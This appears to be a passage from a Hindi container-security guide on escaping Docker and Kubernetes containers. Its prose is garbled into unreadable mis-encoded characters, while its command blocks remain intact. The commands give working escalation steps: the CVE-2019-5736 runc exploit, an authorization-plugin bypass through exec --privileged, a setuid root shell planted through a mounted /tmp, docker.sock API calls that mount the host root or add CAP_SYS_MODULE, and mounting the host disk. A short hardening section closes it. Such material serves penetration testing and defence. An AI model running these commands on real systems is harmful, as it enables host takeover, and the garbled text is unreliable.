рдпрджрд┐ рдЖрдк `docker exec` рдХреЛ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рд╕рдВрднрд╡рддрдГ sudo рдХреЗ рд╕рд╛рде), рддреЛ рдЖрдк CVE-2019-5736 рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдХрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдпрд╣рд╛рдВ рджреБрд░реБрдкрдпреЛрдЧ [рдпрд╣рд╛рдВ](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go) рд╣реИ)ред рдпрд╣ рддрдХрдиреАрдХ рдореВрд▓ рд░реВрдк рд╕реЗ **рдореЗрдЬрд╝рдмрд╛рди** рдХреЗ _**/bin/sh**_ рдмрд╛рдЗрдирд░реА рдХреЛ **рдХрдВрдЯреЗрдирд░** рд╕реЗ **рдЕрдзрд┐рд▓реЗрдЦрд┐рдд** рдХрд░реЗрдЧреА, рдЗрд╕рд▓рд┐рдП рдХреЛрдИ рднреА docker exec рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рд╡реНрдпрдХреНрддрд┐ рдкреНрд░рд╛рдпреЛрдЬрди рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдкреНрд░рд╛рдпреЛрдЬрди рдХреЛ рдЕрдиреБрд░реВрдк рдмрджрд▓реЗрдВ рдФрд░ `go build main.go` рдХреЗ рд╕рд╛рде main.go рдХреЛ рдмрдирд╛рдПрдВред рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдкреА рдмрд╛рдЗрдирд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд▓рд┐рдП рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рд░рдЦрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред\
рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рджреМрд░рд╛рди, рдЬреИрд╕реЗ рд╣реА рдпрд╣ `[+] Overwritten /bin/sh successfully` рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЖрдкрдХреЛ рдореЗрдЬрд╝рдмрд╛рди рдорд╢реАрди рд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛:

`docker exec -it <container-name> /bin/sh`

рдЗрд╕рд╕реЗ main.go рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдореМрдЬреВрдж рдкреНрд░рд╛рдпреЛрдЬрди рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

# рдбреЙрдХрд░ рдСрде рдкреНрд▓рдЧрдЗрди рдмрд╛рдИрдкрд╛рд╕

рдХреБрдЫ рдореМрдХреЛрдВ рдореЗрдВ, рд╕рд┐рд╕реНрдЯрдо рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдбреЙрдХрд░ рдореЗрдВ рдХреБрдЫ рдкреНрд▓рдЧрдЗрди рд╕реНрдерд╛рдкрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдХрдо рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рдмрд┐рдирд╛ рдбреЙрдХрд░ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░ рд╕рдХреЗрдВред

## рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ `run --privileged`

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╕рд┐рд╕реНрдЯрдо рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдиреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ **рд╡реЙрд▓реНрдпреВрдо рдорд╛рдЙрдВрдЯ рдХрд░рдиреЗ рдФрд░ `--privileged` рдлрд╝реНрд▓реИрдЧ рдХреЗ рд╕рд╛рде рдХрдВрдЯреЗрдирд░ рдЪрд▓рд╛рдиреЗ** рдпрд╛ рдХрдВрдЯреЗрдирд░ рдХреЛ рдХреЛрдИ рдЕрддрд┐рд░рд┐рдХреНрдд рдХреНрд╖рдорддрд╛ рдирд╣реАрдВ рджреА рд╣реИ:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
рдпрд╣рд╛рдВ, рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдЪрд▓ рд░рд╣реЗ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдПрдХ рд╢реИрд▓ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдЕрддрд┐рд░рд┐рдХреНрдд рдЕрдзрд┐рдХрд╛рд░ рджреЗ рд╕рдХрддрд╛ рд╣реИ**:
```bash
docker run -d --security-opt "seccomp=unconfined" ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
docker exec -it --privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
```
рдЕрдм, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд╣рд▓реЗ рдЪрд░реНрдЪрд┐рдд рддрдХрдиреАрдХреЛрдВ рдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рднреА рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд╣реЛрд╕реНрдЯ рдореЗрдВ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддрд╛ рд╣реИред

## рдорд╛рдЙрдВрдЯ рдпреЛрдЧреНрдп рдлрд╝реЛрд▓реНрдбрд░

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╕рд┐рд╕рдПрдбрдорд┐рди рдиреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ `--privileged` рдлрд╝реНрд▓реИрдЧ рдХреЗ рд╕рд╛рде рдХрдВрдЯреЗрдирд░ рдЪрд▓рд╛рдиреЗ рд╕реЗ рд░реЛрдХ рджрд┐рдпрд╛ рдпрд╛ рдХрдВрдЯреЗрдирд░ рдХреЛ рдХрд┐рд╕реА рдЕрддрд┐рд░рд┐рдХреНрдд рдХреНрд╖рдорддрд╛ рдХрд╛ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рд╕реЗ рдЗрдВрдХрд╛рд░ рдХрд┐рдпрд╛ рд╣реИ, рдФрд░ рдЙрд╕рдиреЗ рдХреЗрд╡рд▓ `/tmp` рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рд╣реИ:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╢рд╛рдпрдж рдЖрдк `/tmp` рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ рдорд╛рдЙрдВрдЯ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдЖрдк рдПрдХ **рдЕрд▓рдЧ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдлрд╝реЛрд▓реНрдбрд░** рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреЛ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ: `find / -writable -type d 2>/dev/null`

**рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдПрдХ рд▓рд┐рдирдХреНрд╕ рдорд╢реАрди рдореЗрдВ рд╕рднреА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдВ suid рдмрд┐рдЯ рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░реЗрдВрдЧреА!** suid рдмрд┐рдЯ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `mount | grep -v "nosuid"` рдХрдорд╛рдВрдб рдЪрд▓рд╛рдПрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдорддреМрд░ рдкрд░ `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` рдФрд░ `/var/lib/lxcfs` suid рдмрд┐рдЯ рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк **`/etc` рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ рдорд╛рдЙрдВрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реЛрддреА рд╣реИрдВ**, рддреЛ рдЖрдк рдЙрдиреНрд╣реЗрдВ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдмрджрд▓рдХрд░ рдЙрдиреНрд╣реЗрдВ рдЙрдЪреНрдЪрд╛рд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ (рд╢рд╛рдпрдж `/etc/shadow` рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ)
{% endhint %}

## рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХреА рдЧрдИ JSON рд╕рдВрд░рдЪрдирд╛

рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЬрдм рд╕рд┐рд╕рдПрдбрдорд┐рди рдиреЗ рдбреЙрдХрд░ рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдерд╛, рддреЛ рдЙрдиреНрд╣реЛрдВрдиреЗ API ([https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)) рдХреЗ рдХреБрдЫ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкреИрд░рд╛рдореАрдЯрд░ рдЬреИрд╕реЗ "**Binds**" рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ **рднреВрд▓ рдЧрдП** рд╣реЛ рд╕рдХрддрд╛ рд╣реИред\
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рдЗрд╕ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдХрдВрдЯреЗрдирд░ рдмрдирд╛рдирд╛ рдФрд░ рдЪрд▓рд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдЬреЛ рд╣реЛрд╕реНрдЯ рдХрд╛ рд░реВрдЯ (/) рдлрд╝реЛрд▓реНрдбрд░ рдорд╛рдЙрдВрдЯ рдХрд░рддрд╛ рд╣реИ:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
## рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХреА рдЧрдИ JSON рд╡рд┐рд╢реЗрд╖рддрд╛

рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЬрдм рд╕рд┐рд╕реНрдЯрдо рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдиреЗ рдбреЙрдХрд░ рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдерд╛, рддреЛ рдЙрдиреНрд╣реЛрдВрдиреЗ API ([https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)) рдХреЗ "**HostConfig**" рдХреЗ рдЕрдВрджрд░ "**Capabilities**" рдЬреИрд╕реА рдХреБрдЫ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рднреВрд▓ рдЧрдП рд╣реЛрдВред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдЗрд╕ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдо SYS_MODULE рдХреНрд╖рдорддрд╛ рдХреЗ рд╕рд╛рде рдПрдХ рдХрдВрдЯреЗрдирд░ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
# рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп hostPath рдорд╛рдЙрдВрдЯ

(рдпрд╣рд╛рдВ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдорд┐рд▓реА рд╣реИ [**рдпрд╣рд╛рдВ**](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)) рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЕрдкрдиреЗ рдкрд╣реБрдВрдЪ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдХреНрд▓рд╕реНрдЯрд░ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдП рдЧрдП рдПрдХ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп hostPath рд╡реЙрд▓реНрдпреВрдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдореЗрдЬрдмрд╛рди рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдиреАрдЪреЗ рдФрд░ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдиреАрдЪреЗ рдХреБрдЫ рдЖрдо рдЪреАрдЬреЗрдВ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк рдЗрд╕ рд╣рдорд▓рд╛рд╡рд░ рд╡реЗрдХреНрдЯрд░ рдХрд╛ рд▓рд╛рдн рдЙрдард╛ рд╕рдХреЗрдВ:
```bash
### Check if You Can Write to a File-system
$ echo 1 > /proc/sysrq-trigger

### Check root UUID
$ cat /proc/cmdlineBOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300- Check Underlying Host Filesystem
$ findfs UUID=<UUID Value>/dev/sda1- Attempt to Mount the Host's Filesystem
$ mkdir /mnt-test
$ mount /dev/sda1 /mnt-testmount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
$ debugfs /dev/sda1
```
# рдХрдВрдЯреЗрдирд░ рд╕реБрд░рдХреНрд╖рд╛ рдореЗрдВ рд╕реБрдзрд╛рд░

## Docker рдореЗрдВ Seccomp

рдпрд╣ Docker рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХрд╛ рдПрдХ рддрдХрдиреАрдХ рдирд╣реАрдВ рд╣реИ, рдмрд▓реНрдХрд┐ рдпрд╣ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рд╕реБрд╡рд┐рдзрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ Docker рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЖрдкрдХреЛ рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдирд╛ рдЪрд╛рд╣рд┐рдП рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЖрдкрдХреЛ Docker рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рд╕реЗ рд░реЛрдХ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="seccomp.md" %}
[seccomp.md](seccomp.md)
{% endcontent-ref %}

## Docker рдореЗрдВ AppArmor

рдпрд╣ Docker рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХрд╛ рдПрдХ рддрдХрдиреАрдХ рдирд╣реАрдВ рд╣реИ, рдмрд▓реНрдХрд┐ рдпрд╣ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рд╕реБрд╡рд┐рдзрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ Docker рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЖрдкрдХреЛ рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдирд╛ рдЪрд╛рд╣рд┐рдП рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЖрдкрдХреЛ Docker рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рд╕реЗ рд░реЛрдХ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="apparmor.md" %}
[apparmor.md](apparmor.md)
{% endcontent-ref %}

## рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдФрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг

рдПрдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд▓рдЧрдЗрди рд╡рд░реНрддрдорд╛рди рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рдВрджрд░реНрдн рдФрд░ рдХрдорд╛рдВрдб рд╕рдВрджрд░реНрдн рджреЛрдиреЛрдВ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ Docker рдбреЗрдорди рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдпрд╛ рдЗрдирдХрд╛рд░ рдХрд░рддрд╛ рд╣реИред рд╡рд░реНрддрдорд╛рди рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рдВрджрд░реНрдн рдореЗрдВ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╡рд┐рд╡рд░рдг рдФрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╡рд┐рдзрд┐ рд╢рд╛рдорд┐рд▓ рд╣реЛрддреА рд╣реИред рдХрдорд╛рдВрдб рд╕рдВрджрд░реНрдн рдореЗрдВ рд╕рднреА рдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ рдЕрдиреБрд░реЛрдз рдбреЗрдЯрд╛ рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИред

{% content-ref url="broken-reference" %}
[Broken link](broken-reference)
{% endcontent-ref %}

## gVisor

**gVisor** рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд░реНрдирд▓ рд╣реИ, рдЬреЛ Go рдореЗрдВ рд▓рд┐рдЦрд╛ рдЧрдпрд╛ рд╣реИ, рдЬреЛ рд▓рд┐рдирдХреНрд╕ рд╕рд┐рд╕реНрдЯрдо рд╕рддрд╣ рдХрд╛ рдПрдХ рдмрдбрд╝рд╛ рд╣рд┐рд╕реНрд╕рд╛ рд▓рд╛рдЧреВ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдореЗрдВ рдПрдХ [рдУрдкрди рдХрдВрдЯреЗрдирд░ рдЗрдирд┐рд╢рд┐рдПрдЯрд┐рд╡ (OCI)](https://www.opencontainers.org) рд░рдирдЯрд╛рдЗрдо рд╣реИ рдЬрд┐рд╕реЗ `runsc` рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдпрд╣ рдПрдХ **рдЕрдиреБрдкрд╛рдд рд╕реАрдорд╛** рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдФрд░ рд╣реЛрд╕реНрдЯ рдХрд░реНрдирд▓ рдХреЗ рдмреАрдЪред `runsc` рд░рдирдЯрд╛рдЗрдо Docker рдФрд░ Kubernetes рдХреЗ рд╕рд╛рде рдПрдХреАрдХреГрдд рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХрдВрдЯреЗрдирд░ рдЪрд▓рд╛рдирд╛ рдЖрд╕рд╛рди рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред

{% embed url="https://github.com/google/gvisor" %}

# Kata Containers

**Kata Containers** рдПрдХ рдУрдкрди рд╕реЛрд░реНрд╕ рд╕рдореБрджрд╛рдп рд╣реИ рдЬреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрдВрдЯреЗрдирд░ рд░рдирдЯрд╛рдЗрдо рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╛рдо рдХрд░ рд░рд╣рд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рд╣рд▓реНрдХреЗ рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрдВрдЯреЗрдирд░ рдХреА рддрд░рд╣ рд▓рдЧрддреА рд╣реИ рдФрд░ рдХрдВрдЯреЗрдирд░ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ **рд╣рд╛рд░реНрдбрд╡реЗрдпрд░ рд╡рд░реНрдЪреБрдЕрд▓рд╛рдЗрдЬрд╝реЗрд╢рди** рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдордЬрдмреВрдд рд╡рд░реНрдХрд▓реЛрдб рдЖрдЗрд╕реЛрд▓реЗрд╢рди рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИред

{% embed url="https://katacontainers.io/" %}

## рд╕реБрд░рдХреНрд╖рд┐рдд рдврдВрдЧ рд╕реЗ рдХрдВрдЯреЗрдирд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ

рдбреЙрдХрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдФрд░ рд╕реАрдорд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрди рдкреНрд░рддрд┐рдмрдВрдзрдиреЛрдВ рдХреЛ рдвреАрд▓ рдХрд░рдирд╛ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдорд╕реНрдпрд╛рдУрдВ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдпрд╣рд╛рдВ рддрдХ рдХрд┐ `--privileged` рдлрд╝реНрд▓реИрдЧ рдХреА рдкреВрд░реА рд╢рдХреНрддрд┐ рдХреЗ рдмрд┐рдирд╛ред рдкреНрд░рддреНрдпреЗрдХ рдЕрддрд┐рд░рд┐рдХреНрдд рдЕрдиреБрдорддрд┐ рдХреЗ рдкреНрд░рднрд╛рд╡ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ, рдФрд░ рд╕рдВрдкреВрд░реНрдг рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╕реАрдорд┐рдд рдХрд░реЗрдВред

рдХрдВрдЯреЗрдирд░ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦрдиреЗ рдореЗрдВ рдорджрдж рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

* `--privileged` рдлрд╝реНрд▓реИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рди рдХрд░реЗрдВ рдФрд░ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ [Docker рд╕реЙрдХреЗрдЯ рдорд╛рдЙрдВрдЯ](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/) рди рдХрд░реЗрдВред рдбреЙрдХрд░ рд╕реЙрдХреЗрдЯ рдХрдВрдЯреЗрдирд░ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдПрдХ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рд╣реИ рд╣реЛрд╕реНрдЯ рдкрд░ рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `--privileged` рдлрд╝реНрд▓реИрдЧ рдХреЗ рд╕рд╛рде рдПрдХ рдФрд░ рдХрдВрдЯреЗрдирд░ рдЪрд▓рд╛рдХрд░ред
